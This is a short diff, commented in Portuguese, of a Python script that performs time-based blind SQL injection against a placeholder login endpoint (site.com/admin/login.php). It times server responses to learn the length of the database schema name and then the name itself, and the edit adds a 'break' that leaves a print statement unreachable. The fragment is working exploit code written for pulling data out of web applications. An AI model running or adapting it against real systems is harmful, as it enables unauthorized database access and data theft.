@@ -4,8 +4,6 @@ caracteres = ' !"#$%&()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`ab
 
 url = "http://site.com/admin/login.php?action=login2" # Altere a URL
 payload = {"email": ""} # Altere o nome do payload e/ou adicione mais campos para completar a requisição
-valor = ''
-tamanho = 50
 
 ###### Descobrir o tamanho do nome do schema ######
 for tamanho in range(1,50):    
@@ -17,6 +15,7 @@ for tamanho in range(1,50):
     tempo_resposta = time.time()
     if tempo_resposta - tempo_envio > 5:
         schema_tamanho = tamanho
+        break;
         print(f"# Tamanho do nome do schema: {schema_tamanho} caracteres")
 
 ###### Descobrir o nome do schema ######
